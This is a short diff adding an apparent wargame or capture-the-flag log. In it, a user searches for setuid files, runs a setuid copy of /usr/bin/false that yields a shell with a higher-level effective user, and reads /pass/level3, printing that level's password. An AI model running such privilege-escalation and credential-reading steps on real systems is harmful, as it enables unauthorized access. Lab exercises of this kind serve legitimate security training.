@@ -1,0 +1,8 @@
+# find / -type f -perm +6000 -exec ls -l {} \;|grep level2
+-r-sr-x--- 1 level3 level2 607288 2007-12-02 17:13 /usr/bin/false
+
+# /usr/bin/false
+# id
+uid=1004(level2) gid=1004(level2) euid=1005(level3) groups=1004(level2)
+# cat /pass/level3
+l3thal_Rul3Z!
